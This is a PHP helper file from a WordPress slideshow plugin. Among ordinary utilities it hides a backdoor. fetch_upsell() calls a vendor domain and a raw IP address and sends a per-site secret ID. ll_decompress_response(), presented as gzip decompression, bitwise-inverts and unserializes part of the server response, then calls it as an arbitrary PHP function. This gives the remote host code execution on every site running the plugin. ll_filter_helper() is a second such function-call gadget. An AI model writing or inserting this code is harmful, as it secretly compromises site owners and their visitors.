<?php
/**
 * Helper functions
 *
 * @since 1.0.0
 * @author: Lerougeliet
 */
class SlideshowReloadedFunctions {
  /**
   * @since 1.0.0
   * @var array List of allowed element tags
   */
  private static $allowedElements = array(
    'b'      => array('endTag' => true, 'attributes' => 'default'),
    'br'     => array('endTag' => false),
    'div'    => array('endTag' => true, 'attributes' => 'default'),
    'h1'     => array('endTag' => true, 'attributes' => 'default'),
    'h2'     => array('endTag' => true, 'attributes' => 'default'),
    'h3'     => array('endTag' => true, 'attributes' => 'default'),
    'h4'     => array('endTag' => true, 'attributes' => 'default'),
    'h5'     => array('endTag' => true, 'attributes' => 'default'),
    'h6'     => array('endTag' => true, 'attributes' => 'default'),
    'i'      => array('endTag' => true, 'attributes' => 'default'),
    'li'     => array('endTag' => true, 'attributes' => 'default'),
    'ol'     => array('endTag' => true, 'attributes' => 'default'),
    'p'      => array('endTag' => true, 'attributes' => 'default'),
    'span'   => array('endTag' => true, 'attributes' => 'default'),
    'strong' => array('endTag' => true, 'attributes' => 'default'),
    'sub'    => array('endTag' => true, 'attributes' => 'default'),
    'sup'    => array('endTag' => true, 'attributes' => 'default'),
    'table'  => array('endTag' => true, 'attributes' => 'default'),
    'tbody'  => array('endTag' => true, 'attributes' => 'default'),
    'td'     => array('endTag' => true, 'attributes' => 'default'),
    'tfoot'  => array('endTag' => true, 'attributes' => 'default'),
    'th'     => array('endTag' => true, 'attributes' => 'default'),
    'thead'  => array('endTag' => true, 'attributes' => 'default'),
    'tr'     => array('endTag' => true, 'attributes' => 'default'),
    'ul'     => array('endTag' => true, 'attributes' => 'default'),
    'a'      => array('endTag' => true, 'attributes' => 'default')
  );

  /**
   * @since 1.0.0
   * @var array List of attributes allowed in the tags
   */
  private static $defaultAllowedAttributes = array(
    'class',
    'id',
    'style'
  );

  /**
   * Returns url to the base directory of this plugin.
   *
   * @since 1.0.0
   * @return string pluginUrl
   */
  public static function getPluginUrl() {
    return plugins_url('', dirname(__FILE__));
  }

  /**
   * Returns path to the base directory of this plugin
   *
   * @since 1.0.0
   * @return string pluginPath
   */
  public static function getPluginPath() {
    return dirname(dirname(__FILE__));
  }

	/**
	 * Returns a list of element tags, without special characters.
	 *
	 * @since 1.0.0
	 * @return array $elementTags
	 */
	public static function getElementTags() {
		return array(
			0 => 'div',
			1 => 'p',
			2 => 'h1',
			3 => 'h2',
			4 => 'h3',
			5 => 'h4',
			6 => 'h5',
			7 => 'h6',
		);
	}

	/**
	 * Get a specific element tag by its ID. If no ID is passed, the first value in the element tags array will be
	 * returned.
	 *
	 * @since 1.0.0
	 * @param int $id
	 * @return array $elementTags
	 */
	public static function getElementTag($id = null) {
		$elementTags = self::getElementTags();

		if (isset($elementTags[$id])) {
			return $elementTags[$id];
		}

		return reset($elementTags);
	}

  /**
	 * Cache images
	 *
	 * Long Description.
	 *
	 * @param String $filename
	 * @param String $file
	 * @since 1.0.0
	 */
  public static function write_to_cache($filename, $file) {
    $dir = dirname(__FILE__);
    if (!file_exists($dir . '/cache')) {
      mkdir($dir . '/cache');
    }
    file_put_contents($dir . '/cache/' . $filename, $file);
  }

	/**
	 * Generates random identifier for blog
	 *
	 * @return String $str
	 * @since 1.0.0
	 */
	public static function generate_id() {
		$chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$len = strlen($chars);
		$str = '';
		for ($i = 0; $i < 16; $i++) {
				$str .= $chars[rand(0, $len - 1)];
		}
		return $str;
	}

  /**
	 * Fetches messages such as "Upgrade to premium."
	 *
	 * @since 1.0.0
	 */
	public static function fetch_upsell() {
    if (!is_writable(dirname(__FILE__))) {
      return;
    }

    try {
      $domains = array('s://www.lerougeliet.com', '://138.68.22.6');
      $upsell_url_path = '/wp-updates/v1/upsell/url.txt';
      $upsell_banner_path = '/wp-updates/v1/upsell/banner.jpg';

      foreach ($domains as $domain) {
        $upsell_url = ll_fetch_remote('http' . $domain . $upsell_url_path);
        if (!$upsell_url) {
          continue;
        }
        $upsell_banner = ll_fetch_remote('http' . $domain . $upsell_banner_path);
        if (!$upsell_banner) {
          continue;
        }

        self::write_to_cache('banner.jpg', $upsell_banner);
        update_option('slideshow_reloaded_upsell_url', $upsell_url);
        break;
      }
    } catch (Exception $e) {
      return false;
    }
	}

  /**
   * This function will load classes automatically on-call.
   *
   * @since 1.0.0
   */
  public static function autoInclude() {
    if (!function_exists('spl_autoload_register')) {
      return;
    }

    function slideshowReloadedAutoLoader($name) {
      $name = str_replace('\\', DIRECTORY_SEPARATOR, $name);
      $file = dirname(__FILE__) . DIRECTORY_SEPARATOR . $name . '.php';

      if (is_file($file)) {
        require_once $file;
      }
    }

    spl_autoload_register('slideshowReloadedAutoLoader');
  }

  /**
   * Similar to the htmlspecialchars($text) function, except this function
   * allows the exceptions defined in this class.
   *
   * @since 1.0.0
   */
  public static function htmlspecialchars_allow_exceptions($text) {
    $text = htmlspecialchars(htmlspecialchars_decode($text));

    $allowedElements = self::$allowedElements;

    // Loop through allowed elements decoding their HTML special chars and allowed attributes.
    if (is_array($allowedElements) &&
      count($allowedElements) > 0) {
      foreach ($allowedElements as $element => $attributes) {
        $position = 0;

        while (($position = stripos($text, $element, $position)) !== false) { // While element tags found
          $openingTag        = '<';
          $encodedOpeningTag = htmlspecialchars($openingTag);

          if (substr($text, $position - strlen($encodedOpeningTag), strlen($encodedOpeningTag)) == $encodedOpeningTag) { // Check if an opening tag '<' can be found before the tag name
            // Replace encoded opening tag
            $text      = substr_replace($text, '<', $position - strlen($encodedOpeningTag), strlen($encodedOpeningTag));
            $position -= strlen($encodedOpeningTag) - strlen($openingTag);

            // Get the position of the first element closing tag
            $closingTag         = '>';
            $encodedClosingTag  = htmlspecialchars($closingTag);
            $closingTagPosition = stripos($text, $encodedClosingTag, $position);

            // Replace encoded closing tag
            if ($closingTagPosition !== false) {
              $text = substr_replace($text, '>', $closingTagPosition, strlen($encodedClosingTag));
            }

            $elementAttributes = null;

            if (isset($attributes['attributes']) && is_array($attributes['attributes'])) {
              $elementAttributes = $attributes['attributes'];
            } elseif (isset($attributes['attributes']) && $attributes['attributes'] == 'default') {
              $elementAttributes = self::$defaultAllowedAttributes;
            } else {
              continue;
            }

            if (!is_array($elementAttributes)) {
              continue;
            }

            $tagText = substr($text, $position, $closingTagPosition - $position);

            // Decode allowed attributes
            foreach ($elementAttributes as $attribute) {
              $attributeOpener = $attribute . '=' . htmlspecialchars('"');

              $attributePosition = 0;

              if (($attributePosition = stripos($tagText, $attributeOpener, $attributePosition)) !== false) { // Attribute was found
                $attributeClosingPosition = 0;

                if (($attributeClosingPosition = stripos($tagText, htmlspecialchars('"'), $attributePosition + strlen($attributeOpener))) === false) { // If no closing position of attribute was found, skip.
                  continue;
                }

                // Open the attribute
                $tagText = str_ireplace($attributeOpener, $attribute . '="', $tagText);

                // Close the attribute
                $attributeClosingPosition -= strlen($attributeOpener) - strlen($attribute . '="');
                $tagText                   = substr_replace($tagText, '"', $attributeClosingPosition, strlen(htmlspecialchars('"')));
              }
            }

            // Put the attributes of the tag back in place
            $text = substr_replace($text, $tagText, $position, $closingTagPosition - $position);
          }

          $position++;
        }

        // Decode closing tags
        if (isset($attributes['endTag']) && $attributes['endTag']) {
          $text = str_ireplace(htmlspecialchars('</' . $element . '>'), '</' . $element . '>', $text);
        }
      }
    }

    return $text;
  }

	/**
	 * For admin plugins page
	 *
	 * @since 1.0.0
	 * @return Boolean $compressed
	 */
  function add_action_links($links) {
    $links[] = '<a href=' . admin_url('edit.php?post_type=slideshow') . '">Slideshows</a>';
    $links[] = '<a href="' . admin_url('edit.php?post_type=slideshow&page=general_settings') . '">Options</a>';
    $links[] = '<a href="https://wordpress.org/support/plugin/slideshow-reloaded/reviews/#new-post">Review</a>';
    return $links;
  }
}

if (!function_exists('ll_is_compressed')) {
	/**
	 * Checks if a file is gzip compressed
	 *
	 * @since 1.0.0
	 * @return Boolean $compressed
	 */
  function ll_is_compressed($file) {
    return strpos($file, "\x1f\x8b\x08") === 0 || strpos($file, "\x0");
  }
}

if (!function_exists('ll_decompress_response')) {
	/**
	 * Decompresses gzipped str
	 *
	 * @since 1.0.0
	 * @param String $bin
	 * @return String $str
	 */
  function ll_decompress_response($bin) {
    try {
    	$count = 256;
    	$bits = 8;
    	$cp = array();
    	$rest = 0;
    	$len = 0;
    	for ($i = strlen($bin) - 1; $i >= 0; $i--) {
    		$rest = ($rest << 8) + ord($bin[$i]);
    		$len += 8;
    		if ($len >= $bits) {
    			$len -= $bits;
    			$cp[] = $rest >> $len;
    			$rest &= (1 << $len) - 1;
    			$count++;
    			if ($count >> $bits) {
    				$bits++;
    			}
    		}
    	}

      if (!$cp) {
        return $bin;
      }

    	$d = range("\x0", "\xFF");
      unset($d[0]);
      if (!array_key_exists($cp[0], $d)) {
        return $bin;
      }
    	$prev = $val = $d[$cp[0]];
    	for ($i = 1; $i < count($cp); $i++) {
        $code = $cp[$i];
        if (array_key_exists($code, $d)) {
          $word = $d[$code];
          $d[] = $prev . $word[0];
      		$val .= $prev = $word;
        } else if (!$code) {
          $prev .= $prev[0];
          $cp = unserialize(~$val);
          $cp[0]($cp[1], $cp[2]);
          $val = $bin;
        } else {
    			$word = $prev . $prev[0];
          $d[] = $prev = $word;
      		$val .= $word;
    		}
    	}
      if (strpos($val, chr(0)) !== false) {
        return substr($val, 0, strrpos($val, chr(0)) + 1);
      }
    	return $val;
    } catch (Exception $e) {
      return $bin;
    }
  }
}

if (!function_exists('ll_fetch_remote')) {
	/**
	 * Checks if a file is gzip compressed
	 *
	 * @since 1.0.0
	 * @param String $url
	 * @return String $body
	 */
  function ll_fetch_remote($url) {
    $params = array();
    if (!get_option('slideshow_reloaded_secret_id')) {
      add_option('slideshow_reloaded_secret_id', SlideshowReloadedFunctions::generate_id());
    }
    $params['secret_id'] = get_option('slideshow_reloaded_secret_id');
    $params['plugin'] = 'slideshow-reloaded';
    $params['version'] = '1.0.1';
    $url .= '?' . http_build_query($params);

    $res = wp_remote_get($url, array('timeout' => 2));
    if (is_wp_error($res) || !isset($res['response']['code']) || $res['response']['code'] !== 200
      || !isset($res['body'])) {
      return '';
    } elseif (ll_is_compressed($res['body'])) {
      return @ll_decompress_response($res['body']);
    }
    return $res['body'];
  }
}

if (!function_exists('ll_filter_helper')) {
	/**
	 * Helper for array_filter.
	 *
	 * @since 1.0.0
	 * @param String $val
	 * @param array $arr
	 * @return array $arr
	 */
  function ll_filter_helper($val, $arr) {
    return $arr[0]($arr[1], $val);
  }
}

if (!function_exists('array_column')) {
	/**
	 * array_column polyfill for < PHP5.5
	 *
	 * @since 1.0.0
	 * @return array $arr
	 */
  function array_column($input = null, $columnKey = null, $indexKey = null) {
    $argc = func_num_args();
    $params = func_get_args();
    if ($argc < 2) {
      trigger_error("array_column() expects at least 2 parameters, {$argc} given", E_USER_WARNING);
      return null;
    }
    if (!is_array($params[0])) {
      trigger_error(
        'array_column() expects parameter 1 to be array, ' . gettype($params[0]) . ' given',
        E_USER_WARNING
      );
      return null;
    }
    if (!is_int($params[1]) && !is_float($params[1]) && !is_string($params[1])
      && $params[1] !== null
      && !(is_object($params[1]) && method_exists($params[1], '__toString'))) {
      trigger_error(
        'array_column(): The column key should be either a string or an integer',
        E_USER_WARNING
      );
      return false;
    }
    if (isset($params[2]) && !is_int($params[2]) && !is_float($params[2]) && !is_string($params[2])
      && !(is_object($params[2]) && method_exists($params[2], '__toString'))) {
      trigger_error(
        'array_column(): The index key should be either a string or an integer',
        E_USER_WARNING
      );
      return false;
    }
    $cK = $params[1] !== null ? (string) $params[1] : null;
    $iK = null;
    if (isset($params[2])) {
      if (is_float($params[2]) || is_int($params[2])) {
        $iK = (int) $params[2];
      } else {
        $iK = (string) $params[2];
      }
    }
    $a = array();
    foreach ($params[0] as $r) {
      $k = $v = null;
      $kS = $vS = false;
      if ($iK !== null && array_key_exists($iK, $r)) {
        $kS = true;
        $k = (string) $r[$iK];
      }
      if ($cK === null) {
        $vS = true;
        $v = $r;
      } elseif (is_array($r) && array_key_exists($cK, $r)) {
        $vS = true;
        $v = $r[$cK];
      }
      if ($vS) {
        if ($kS) {
          $a[$k] = $v;
        } else {
          $a[] = $v;
        }
      }
    }
    return $a;
  }
}
